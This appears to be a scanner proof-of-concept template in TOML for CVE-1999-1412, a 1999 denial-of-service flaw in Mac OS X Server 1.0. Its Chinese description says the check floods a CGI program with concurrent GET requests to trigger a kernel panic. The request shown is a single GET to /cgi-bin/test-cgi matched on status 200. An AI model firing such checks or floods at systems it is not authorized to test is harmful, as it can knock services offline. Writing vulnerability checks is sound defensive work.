[info]
author = "ave"
description = "通过向目标 Apache HTTP Server 的 CGI 程序并发发送大量 HTTP GET 请求，触发 Mac OS X Server 1.0 内核 panic，验证拒绝服务漏洞存在。参考 ExploitDB 19244 CGI-McPanic 脚本。"
id = "POC-AVE-1999-1101"
name = "CVE-1999-1412 PoC"
severity = "medium"
tags = ["ave-1999-1101"]
vuln_id = [
    "CVE-1999-1412",
    "AVE-1999-1101",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/test-cgi"
protocol = "http"

[poc.requests.headers]
Connection = "keep-alive"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
